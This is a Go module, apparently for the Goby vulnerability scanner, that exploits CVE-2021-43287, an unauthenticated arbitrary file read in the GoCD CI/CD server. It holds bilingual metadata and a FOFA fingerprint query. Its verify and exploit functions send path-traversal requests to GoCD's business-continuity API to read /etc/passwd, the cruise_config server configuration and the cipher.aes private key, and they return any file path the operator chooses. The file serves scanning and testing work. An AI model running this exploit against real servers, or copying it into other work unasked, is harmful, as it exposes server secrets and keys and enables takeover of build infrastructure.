package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "GoCD Arbitrary File Read",
    "Description": "<p>GoCD is a free and open source CI/CD server.</p><p>The lack of authentication in the GoCD/add-on/ path causes an attacker to read any file, including sensitive information such as the cruise_config server configuration file and the cipher.aes private key.</p>",
    "Impact": "GoCD Arbitrary File Read",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.gocd.org\">https://www.gocd.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "GoCD",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "GoCD 服务任意文件读取漏洞",
            "Description": "<p>GoCD是一款免费和开源的 CI/CD 服务。</p><p>GoCD/add-on/路径缺少身份验证，导致攻击者可以读取任意文件，包括cruise_config服务器配置文件和cipher.aes私有秘钥等敏感信息。</p>",
            "Impact": "<p>GoCD/add-on/路径缺少身份验证，导致攻击者可以读取任意文件，包括cruise_config服务器配置文件和cipher.aes私有秘钥等敏感信息。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.gocd.org\">https://www.gocd.org</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "GoCD",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "GoCD Arbitrary File Read",
            "Description": "<p>GoCD is a free and open source CI/CD server.</p><p>The lack of authentication in the GoCD/add-on/ path causes an attacker to read any file, including sensitive information such as the cruise_config server configuration file and the cipher.aes private key.</p>",
            "Impact": "GoCD Arbitrary File Read",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.gocd.org\">https://www.gocd.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "GoCD",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"data-current-gocd-version\"",
    "GobyQuery": "body=\"data-current-gocd-version\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.gocd.org",
    "DisclosureDate": "2021-11-01",
    "References": [
        "https://censys.io/blog/gocd-unauthenticated-takeover/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-43287"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "plugin?folderName=a&pluginName=/../../../../../../../../etc/passwd,cruise_config,cipher.aes",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [
            "GoCD"
        ],
        "System": [],
        "Hardware": []
    },
    "PocId": "10233"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/go/add-on/business-continuity/api/plugin?folderName=a&pluginName=/../../../../../../../../etc/passwd"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp1.RawBody) {
					return true
				}
			}
			uri2 := "/go/add-on/business-continuity/api/cruise_config"
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "property") && strings.Contains(resp2.RawBody, "agentAutoRegisterKey") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/go/add-on/business-continuity/api/" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
